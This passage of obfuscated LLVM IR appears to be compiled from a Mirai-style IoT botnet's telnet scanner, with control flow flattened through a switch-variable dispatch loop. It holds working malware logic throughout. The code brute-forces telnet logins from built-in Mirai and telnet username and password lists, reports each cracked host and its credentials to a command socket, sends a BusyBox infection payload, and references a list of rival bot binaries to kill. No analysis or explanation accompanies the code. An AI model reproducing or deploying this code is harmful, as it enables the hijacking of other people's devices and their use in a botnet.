  br label %loopEnd

; <label>:503:                                    ; preds = %loopEntry
  store i32 1672189596, i32* %switchVar
  br label %loopEnd

; <label>:504:                                    ; preds = %loopEntry
  %505 = load i32, i32* %6, align 4
  %506 = sext i32 %505 to i64
  %.reload76 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %507 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload76, i64 %506
  %508 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %507, i32 0, i32 7
  %509 = load i32, i32* %508, align 16
  %510 = add i32 %509, 7
  %511 = zext i32 %510 to i64
  %512 = call i64 @time(i64* null) #5
  %513 = icmp slt i64 %511, %512
  %514 = select i1 %513, i32 -335912549, i32 908569055
  store i32 %514, i32* %switchVar
  br label %loopEnd

; <label>:515:                                    ; preds = %loopEntry
  %516 = load i32, i32* %6, align 4
  %517 = sext i32 %516 to i64
  %.reload75 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %518 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload75, i64 %517
  call void @reset_telstate(%struct.telstate_t* %518)
  store i32 908569055, i32* %switchVar
  br label %loopEnd

; <label>:519:                                    ; preds = %loopEntry
  store i32 1563371320, i32* %switchVar
  br label %loopEnd

; <label>:520:                                    ; preds = %loopEntry
  %521 = load i32, i32* %6, align 4
  %522 = sext i32 %521 to i64
  %.reload74 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %523 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload74, i64 %522
  %524 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %523, i32 0, i32 0
  %525 = load i32, i32* %524, align 16
  %526 = load i32, i32* %6, align 4
  %527 = sext i32 %526 to i64
  %.reload73 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %528 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload73, i64 %527
  %529 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %528, i32 0, i32 5
  %530 = load i8, i8* %529, align 1
  %531 = zext i8 %530 to i64
  %532 = getelementptr inbounds [1 x i8*], [1 x i8*]* @Mirai_Passwords, i64 0, i64 %531
  %533 = load i8*, i8** %532, align 8
  %534 = load i32, i32* %6, align 4
  %535 = sext i32 %534 to i64
  %.reload72 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %536 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload72, i64 %535
  %537 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %536, i32 0, i32 5
  %538 = load i8, i8* %537, align 1
  %539 = zext i8 %538 to i64
  %540 = getelementptr inbounds [1 x i8*], [1 x i8*]* @Mirai_Passwords, i64 0, i64 %539
  %541 = load i8*, i8** %540, align 8
  %542 = call i64 @strlen(i8* %541) #9
  %543 = call i64 @send(i32 %525, i8* %533, i64 %542, i32 16384)
  %544 = icmp slt i64 %543, 0
  %545 = select i1 %544, i32 -1850329518, i32 -1890838407
  store i32 %545, i32* %switchVar
  br label %loopEnd

; <label>:546:                                    ; preds = %loopEntry
  %547 = load i32, i32* %6, align 4
  %548 = sext i32 %547 to i64
  %.reload71 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %549 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload71, i64 %548
  call void @reset_telstate(%struct.telstate_t* %549)
  store i32 1672189596, i32* %switchVar
  br label %loopEnd

; <label>:550:                                    ; preds = %loopEntry
  %551 = load i32, i32* %6, align 4
  %552 = sext i32 %551 to i64
  %.reload70 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %553 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload70, i64 %552
  %554 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %553, i32 0, i32 0
  %555 = load i32, i32* %554, align 16
  %556 = call i64 @send(i32 %555, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.487, i32 0, i32 0), i64 2, i32 16384)
  %557 = icmp slt i64 %556, 0
  %558 = select i1 %557, i32 1013223545, i32 1136819599
  store i32 %558, i32* %switchVar
  br label %loopEnd

; <label>:559:                                    ; preds = %loopEntry
  %560 = load i32, i32* %6, align 4
  %561 = sext i32 %560 to i64
  %.reload69 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %562 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload69, i64 %561
  call void @reset_telstate(%struct.telstate_t* %562)
  store i32 1672189596, i32* %switchVar
  br label %loopEnd

; <label>:563:                                    ; preds = %loopEntry
  %564 = load i32, i32* %6, align 4
  %565 = sext i32 %564 to i64
  %.reload68 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %566 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload68, i64 %565
  call void @advance_telstate(%struct.telstate_t* %566, i32 6)
  store i32 1563371320, i32* %switchVar
  br label %loopEnd

; <label>:567:                                    ; preds = %loopEntry
  %568 = load i32, i32* %6, align 4
  %569 = sext i32 %568 to i64
  %.reload67 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %570 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload67, i64 %569
  %571 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %570, i32 0, i32 0
  %572 = load i32, i32* %571, align 16
  %573 = load i32, i32* %3, align 4
  %574 = load i32, i32* %6, align 4
  %575 = sext i32 %574 to i64
  %.reload66 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %576 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload66, i64 %575
  %577 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %576, i32 0, i32 9
  %578 = load i8*, i8** %577, align 8
  %579 = call i32 @read_until_response(i32 %572, i32 %573, i8* %578, i32 1024, i8** getelementptr inbounds ([11 x i8*], [11 x i8*]* @advances2, i32 0, i32 0))
  %580 = icmp ne i32 %579, 0
  %581 = select i1 %580, i32 1301050761, i32 -1360223319
  store i32 %581, i32* %switchVar
  br label %loopEnd

; <label>:582:                                    ; preds = %loopEntry
  %583 = call i64 @time(i64* null) #5
  %584 = trunc i64 %583 to i32
  %585 = load i32, i32* %6, align 4
  %586 = sext i32 %585 to i64
  %.reload65 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %587 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload65, i64 %586
  %588 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %587, i32 0, i32 7
  store i32 %584, i32* %588, align 16
  %589 = load i32, i32* %6, align 4
  %590 = sext i32 %589 to i64
  %.reload64 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %591 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload64, i64 %590
  %592 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %591, i32 0, i32 9
  %593 = load i8*, i8** %592, align 8
  %594 = call i32 @contains_fail(i8* %593)
  %595 = icmp ne i32 %594, 0
  %596 = select i1 %595, i32 2107739022, i32 -2008663346
  store i32 %596, i32* %switchVar
  br label %loopEnd

; <label>:597:                                    ; preds = %loopEntry
  %598 = load i32, i32* %6, align 4
  %599 = sext i32 %598 to i64
  %.reload63 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %600 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload63, i64 %599
  call void @advance_telstate(%struct.telstate_t* %600, i32 0)
  store i32 1788322878, i32* %switchVar
  br label %loopEnd

; <label>:601:                                    ; preds = %loopEntry
  %602 = load i32, i32* %6, align 4
  %603 = sext i32 %602 to i64
  %.reload62 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %604 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload62, i64 %603
  %605 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %604, i32 0, i32 9
  %606 = load i8*, i8** %605, align 8
  %607 = call i32 @contains_success(i8* %606)
  %608 = icmp ne i32 %607, 0
  %609 = select i1 %608, i32 -405506387, i32 2094994867
  store i32 %609, i32* %switchVar
  br label %loopEnd

; <label>:610:                                    ; preds = %loopEntry
  %611 = load i32, i32* %6, align 4
  %612 = sext i32 %611 to i64
  %.reload61 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %613 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload61, i64 %612
  %614 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %613, i32 0, i32 3
  %615 = load i8, i8* %614, align 1
  %616 = zext i8 %615 to i32
  %617 = icmp eq i32 %616, 2
  %618 = select i1 %617, i32 384816189, i32 -748208940
  store i32 %618, i32* %switchVar
  br label %loopEnd

; <label>:619:                                    ; preds = %loopEntry
  %620 = load i32, i32* %6, align 4
  %621 = sext i32 %620 to i64
  %.reload60 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %622 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload60, i64 %621
  call void @advance_telstate(%struct.telstate_t* %622, i32 7)
  store i32 1518072081, i32* %switchVar
  br label %loopEnd

; <label>:623:                                    ; preds = %loopEntry
  %624 = load i32, i32* @mainCommSock, align 4
  %625 = load i32, i32* %6, align 4
  %626 = sext i32 %625 to i64
  %.reload59 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %627 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload59, i64 %626
  %628 = call i8* @get_telstate_host(%struct.telstate_t* %627)
  %629 = load i32, i32* %6, align 4
  %630 = sext i32 %629 to i64
  %.reload58 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %631 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload58, i64 %630
  %632 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %631, i32 0, i32 4
  %633 = load i8, i8* %632, align 2
  %634 = zext i8 %633 to i64
  %635 = getelementptr inbounds [1 x i8*], [1 x i8*]* @Mirai_Usernames, i64 0, i64 %634
  %636 = load i8*, i8** %635, align 8
  %637 = load i32, i32* %6, align 4
  %638 = sext i32 %637 to i64
  %.reload57 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %639 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload57, i64 %638
  %640 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %639, i32 0, i32 5
  %641 = load i8, i8* %640, align 1
  %642 = zext i8 %641 to i64
  %643 = getelementptr inbounds [1 x i8*], [1 x i8*]* @Mirai_Passwords, i64 0, i64 %642
  %644 = load i8*, i8** %643, align 8
  %645 = call i32 (i32, i8*, ...) @sockprintf(i32 %624, i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.488, i32 0, i32 0), i8* %628, i8* %636, i8* %644)
  %646 = load i32, i32* %6, align 4
  %647 = sext i32 %646 to i64
  %.reload56 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %648 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload56, i64 %647
  call void @advance_telstate(%struct.telstate_t* %648, i32 7)
  store i32 1518072081, i32* %switchVar
  br label %loopEnd

; <label>:649:                                    ; preds = %loopEntry
  store i32 -316668224, i32* %switchVar
  br label %loopEnd

; <label>:650:                                    ; preds = %loopEntry
  %651 = load i32, i32* %6, align 4
  %652 = sext i32 %651 to i64
  %.reload55 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %653 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload55, i64 %652
  call void @reset_telstate(%struct.telstate_t* %653)
  store i32 -316668224, i32* %switchVar
  br label %loopEnd

; <label>:654:                                    ; preds = %loopEntry
  store i32 1788322878, i32* %switchVar
  br label %loopEnd

; <label>:655:                                    ; preds = %loopEntry
  store i32 1672189596, i32* %switchVar
  br label %loopEnd

; <label>:656:                                    ; preds = %loopEntry
  %657 = load i32, i32* %6, align 4
  %658 = sext i32 %657 to i64
  %.reload54 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %659 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload54, i64 %658
  %660 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %659, i32 0, i32 7
  %661 = load i32, i32* %660, align 16
  %662 = add i32 %661, 7
  %663 = zext i32 %662 to i64
  %664 = call i64 @time(i64* null) #5
  %665 = icmp slt i64 %663, %664
  %666 = select i1 %665, i32 1018059107, i32 866448020
  store i32 %666, i32* %switchVar
  br label %loopEnd

; <label>:667:                                    ; preds = %loopEntry
  %668 = load i32, i32* %6, align 4
  %669 = sext i32 %668 to i64
  %.reload53 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %670 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload53, i64 %669
  call void @reset_telstate(%struct.telstate_t* %670)
  store i32 866448020, i32* %switchVar
  br label %loopEnd

; <label>:671:                                    ; preds = %loopEntry
  store i32 1563371320, i32* %switchVar
  br label %loopEnd

; <label>:672:                                    ; preds = %loopEntry
  %673 = getelementptr inbounds [80 x i8], [80 x i8]* %23, i32 0, i32 0
  %674 = call i32 (i8*, i8*, ...) @sprintf(i8* %673, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.489, i32 0, i32 0), i8** getelementptr inbounds ([13 x i8*], [13 x i8*]* @Temp_Directorys, i32 0, i32 0)) #5
  %675 = load i32, i32* %6, align 4
  %676 = sext i32 %675 to i64
  %.reload52 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %677 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload52, i64 %676
  %678 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %677, i32 0, i32 0
  %679 = load i32, i32* %678, align 16
  %680 = getelementptr inbounds [80 x i8], [80 x i8]* %23, i32 0, i32 0
  %681 = getelementptr inbounds [80 x i8], [80 x i8]* %23, i32 0, i32 0
  %682 = call i64 @strlen(i8* %681) #9
  %683 = call i64 @send(i32 %679, i8* %680, i64 %682, i32 16384)
  %684 = icmp slt i64 %683, 0
  %685 = select i1 %684, i32 1923301001, i32 -876034235
  store i32 %685, i32* %switchVar
  br label %loopEnd

; <label>:686:                                    ; preds = %loopEntry
  %687 = load i32, i32* %6, align 4
  %688 = sext i32 %687 to i64
  %.reload51 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %689 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload51, i64 %688
  call void @reset_telstate(%struct.telstate_t* %689)
  store i32 1672189596, i32* %switchVar
  br label %loopEnd

; <label>:690:                                    ; preds = %loopEntry
  call void @RemoveTempDirs()
  %691 = load i32, i32* @mainCommSock, align 4
  %692 = load i32, i32* %6, align 4
  %693 = sext i32 %692 to i64
  %.reload50 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %694 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload50, i64 %693
  %695 = call i8* @get_telstate_host(%struct.telstate_t* %694)
  %696 = load i32, i32* %6, align 4
  %697 = sext i32 %696 to i64
  %.reload49 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %698 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload49, i64 %697
  %699 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %698, i32 0, i32 4
  %700 = load i8, i8* %699, align 2
  %701 = zext i8 %700 to i64
  %702 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Usernames, i64 0, i64 %701
  %703 = load i8*, i8** %702, align 8
  %704 = load i32, i32* %6, align 4
  %705 = sext i32 %704 to i64
  %.reload48 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %706 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload48, i64 %705
  %707 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %706, i32 0, i32 5
  %708 = load i8, i8* %707, align 1
  %709 = zext i8 %708 to i64
  %710 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Passwords, i64 0, i64 %709
  %711 = load i8*, i8** %710, align 8
  %712 = call i32 (i32, i8*, ...) @sockprintf(i32 %691, i8* getelementptr inbounds ([91 x i8], [91 x i8]* @.str.490, i32 0, i32 0), i8* %695, i8* %703, i8* %711)
  %713 = getelementptr inbounds [80 x i8], [80 x i8]* %24, i32 0, i32 0
  %714 = call i32 (i8*, i8*, ...) @sprintf(i8* %713, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.491, i32 0, i32 0), i8** getelementptr inbounds ([355 x i8*], [355 x i8*]* @Bot_Killer_Binarys, i32 0, i32 0), i8** getelementptr inbounds ([355 x i8*], [355 x i8*]* @Bot_Killer_Binarys, i32 0, i32 0)) #5
  %715 = load i32, i32* %6, align 4
  %716 = sext i32 %715 to i64
  %.reload47 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %717 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload47, i64 %716
  %718 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %717, i32 0, i32 0
  %719 = load i32, i32* %718, align 16
  %720 = getelementptr inbounds [80 x i8], [80 x i8]* %24, i32 0, i32 0
  %721 = getelementptr inbounds [80 x i8], [80 x i8]* %24, i32 0, i32 0
  %722 = call i64 @strlen(i8* %721) #9
  %723 = call i64 @send(i32 %719, i8* %720, i64 %722, i32 16384)
  %724 = icmp slt i64 %723, 0
  %725 = select i1 %724, i32 185163418, i32 -259020161
  store i32 %725, i32* %switchVar
  br label %loopEnd

; <label>:726:                                    ; preds = %loopEntry
  %727 = load i32, i32* %6, align 4
  %728 = sext i32 %727 to i64
  %.reload46 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %729 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload46, i64 %728
  call void @reset_telstate(%struct.telstate_t* %729)
  store i32 1672189596, i32* %switchVar
  br label %loopEnd

; <label>:730:                                    ; preds = %loopEntry
  %731 = load i32, i32* @mainCommSock, align 4
  %732 = load i32, i32* %6, align 4
  %733 = sext i32 %732 to i64
  %.reload45 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %734 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload45, i64 %733
  %735 = call i8* @get_telstate_host(%struct.telstate_t* %734)
  %736 = load i32, i32* %6, align 4
  %737 = sext i32 %736 to i64
  %.reload44 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %738 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload44, i64 %737
  %739 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %738, i32 0, i32 4
  %740 = load i8, i8* %739, align 2
  %741 = zext i8 %740 to i64
  %742 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Usernames, i64 0, i64 %741
  %743 = load i8*, i8** %742, align 8
  %744 = load i32, i32* %6, align 4
  %745 = sext i32 %744 to i64
  %.reload43 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %746 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload43, i64 %745
  %747 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %746, i32 0, i32 5
  %748 = load i8, i8* %747, align 1
  %749 = zext i8 %748 to i64
  %750 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Passwords, i64 0, i64 %749
  %751 = load i8*, i8** %750, align 8
  %752 = call i32 (i32, i8*, ...) @sockprintf(i32 %731, i8* getelementptr inbounds ([78 x i8], [78 x i8]* @.str.492, i32 0, i32 0), i8* %735, i8* %743, i8* %751)
  %753 = load i32, i32* %6, align 4
  %754 = sext i32 %753 to i64
  %.reload42 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %755 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload42, i64 %754
  call void @advance_telstate(%struct.telstate_t* %755, i32 8)
  store i32 1563371320, i32* %switchVar
  br label %loopEnd

; <label>:756:                                    ; preds = %loopEntry
  %757 = call i64 @time(i64* null) #5
  %758 = trunc i64 %757 to i32
  %759 = load i32, i32* %6, align 4
  %760 = sext i32 %759 to i64
  %.reload41 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %761 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload41, i64 %760
  %762 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %761, i32 0, i32 7
  store i32 %758, i32* %762, align 16
  %763 = load i32, i32* %6, align 4
  %764 = sext i32 %763 to i64
  %.reload40 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %765 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload40, i64 %764
  %766 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %765, i32 0, i32 0
  %767 = load i32, i32* %766, align 16
  %768 = call i64 @send(i32 %767, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.493, i32 0, i32 0), i64 4, i32 16384)
  %769 = icmp slt i64 %768, 0
  %770 = select i1 %769, i32 1653540511, i32 1713947714
  store i32 %770, i32* %switchVar
  br label %loopEnd

; <label>:771:                                    ; preds = %loopEntry
  store i32 1713947714, i32* %switchVar
  br label %loopEnd

; <label>:772:                                    ; preds = %loopEntry
  %773 = load i32, i32* %6, align 4
  %774 = sext i32 %773 to i64
  %.reload39 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %775 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload39, i64 %774
  %776 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %775, i32 0, i32 0
  %777 = load i32, i32* %776, align 16
  %778 = call i64 @send(i32 %777, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.494, i32 0, i32 0), i64 7, i32 16384)
  %779 = icmp slt i64 %778, 0
  %780 = select i1 %779, i32 -1942680602, i32 -544557042
  store i32 %780, i32* %switchVar
  br label %loopEnd

; <label>:781:                                    ; preds = %loopEntry
  store i32 -544557042, i32* %switchVar
  br label %loopEnd

; <label>:782:                                    ; preds = %loopEntry
  %783 = load i32, i32* %6, align 4
  %784 = sext i32 %783 to i64
  %.reload38 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %785 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload38, i64 %784
  %786 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %785, i32 0, i32 0
  %787 = load i32, i32* %786, align 16
  %788 = load i8*, i8** @Busybox_Payload, align 8
  %789 = load i8*, i8** @Busybox_Payload, align 8
  %790 = call i64 @strlen(i8* %789) #9
  %791 = call i64 @send(i32 %787, i8* %788, i64 %790, i32 16384)
  %792 = icmp slt i64 %791, 0
  %793 = select i1 %792, i32 -798204723, i32 1722477212
  store i32 %793, i32* %switchVar
  br label %loopEnd

; <label>:794:                                    ; preds = %loopEntry
  %795 = load i32, i32* %6, align 4
  %796 = sext i32 %795 to i64
  %.reload37 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %797 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload37, i64 %796
  call void @reset_telstate(%struct.telstate_t* %797)
  store i32 1672189596, i32* %switchVar
  br label %loopEnd

; <label>:798:                                    ; preds = %loopEntry
  %799 = load i32, i32* @mainCommSock, align 4
  %800 = load i32, i32* %6, align 4
  %801 = sext i32 %800 to i64
  %.reload36 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %802 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload36, i64 %801
  %803 = call i8* @get_telstate_host(%struct.telstate_t* %802)
  %804 = load i32, i32* %6, align 4
  %805 = sext i32 %804 to i64
  %.reload35 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %806 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload35, i64 %805
  %807 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %806, i32 0, i32 4
  %808 = load i8, i8* %807, align 2
  %809 = zext i8 %808 to i64
  %810 = getelementptr inbounds [1 x i8*], [1 x i8*]* @Mirai_Usernames, i64 0, i64 %809
  %811 = load i8*, i8** %810, align 8
  %812 = load i32, i32* %6, align 4
  %813 = sext i32 %812 to i64
  %.reload34 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %814 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload34, i64 %813
  %815 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %814, i32 0, i32 5
  %816 = load i8, i8* %815, align 1
  %817 = zext i8 %816 to i64
  %818 = getelementptr inbounds [1 x i8*], [1 x i8*]* @Mirai_Passwords, i64 0, i64 %817
  %819 = load i8*, i8** %818, align 8
  %820 = call i32 (i32, i8*, ...) @sockprintf(i32 %799, i8* getelementptr inbounds ([75 x i8], [75 x i8]* @.str.495, i32 0, i32 0), i8* %803, i8* %811, i8* %819)
  %821 = load i32, i32* %6, align 4
  %822 = sext i32 %821 to i64
  %.reload33 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %823 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload33, i64 %822
  %824 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %823, i32 0, i32 0
  %825 = load i32, i32* %824, align 16
  %826 = load i32, i32* %3, align 4
  %827 = load i32, i32* %6, align 4
  %828 = sext i32 %827 to i64
  %.reload32 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %829 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload32, i64 %828
  %830 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %829, i32 0, i32 9
  %831 = load i8*, i8** %830, align 8
  %832 = call i32 @read_until_response(i32 %825, i32 %826, i8* %831, i32 1024, i8** bitcast ([10 x i8]* @.str.499 to i8**))
  %833 = icmp ne i32 %832, 0
  %834 = select i1 %833, i32 513017631, i32 -1062104436
  store i32 %834, i32* %switchVar
  br label %loopEnd

; <label>:835:                                    ; preds = %loopEntry
  %836 = load i32, i32* %6, align 4
  %837 = sext i32 %836 to i64
  %.reload31 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %838 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload31, i64 %837
  %839 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %838, i32 0, i32 9
  %840 = load i8*, i8** %839, align 8
  %841 = call i32 (i8*, i8*, ...) bitcast (i32 (...)* @strcasestr to i32 (i8*, i8*, ...)*)(i8* %840, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.496, i32 0, i32 0))
  %842 = icmp ne i32 %841, 0
  %843 = select i1 %842, i32 1407800838, i32 -901316176
  store i32 %843, i32* %switchVar
  br label %loopEnd

; <label>:844:                                    ; preds = %loopEntry
  %845 = load i32, i32* %6, align 4
  %846 = sext i32 %845 to i64
  %.reload30 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %847 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload30, i64 %846
  %848 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %847, i32 0, i32 3
  %849 = load i8, i8* %848, align 1
  %850 = zext i8 %849 to i32
  %851 = icmp ne i32 %850, 3
  %852 = select i1 %851, i32 -876832054, i32 -901316176
  store i32 %852, i32* %switchVar
  br label %loopEnd

; <label>:853:                                    ; preds = %loopEntry
  %854 = load i32, i32* @mainCommSock, align 4
  %855 = load i32, i32* %6, align 4
  %856 = sext i32 %855 to i64
  %.reload29 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %857 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload29, i64 %856
  %858 = call i8* @get_telstate_host(%struct.telstate_t* %857)
  %859 = load i32, i32* %6, align 4
  %860 = sext i32 %859 to i64
  %.reload28 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %861 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload28, i64 %860
  %862 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %861, i32 0, i32 4
  %863 = load i8, i8* %862, align 2
  %864 = zext i8 %863 to i64
  %865 = getelementptr inbounds [1 x i8*], [1 x i8*]* @Mirai_Usernames, i64 0, i64 %864
  %866 = load i8*, i8** %865, align 8
  %867 = load i32, i32* %6, align 4
  %868 = sext i32 %867 to i64
  %.reload27 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %869 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload27, i64 %868
  %870 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %869, i32 0, i32 5
  %871 = load i8, i8* %870, align 1
  %872 = zext i8 %871 to i64
  %873 = getelementptr inbounds [1 x i8*], [1 x i8*]* @Mirai_Passwords, i64 0, i64 %872
  %874 = load i8*, i8** %873, align 8
  %875 = call i32 (i32, i8*, ...) @sockprintf(i32 %854, i8* getelementptr inbounds ([85 x i8], [85 x i8]* @.str.497, i32 0, i32 0), i8* %858, i8* %866, i8* %874)
  store i32 -901316176, i32* %switchVar
  br label %loopEnd

; <label>:876:                                    ; preds = %loopEntry
  store i32 -1062104436, i32* %switchVar
  br label %loopEnd

; <label>:877:                                    ; preds = %loopEntry
  %878 = load i32, i32* %6, align 4
  %879 = sext i32 %878 to i64
  %.reload26 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
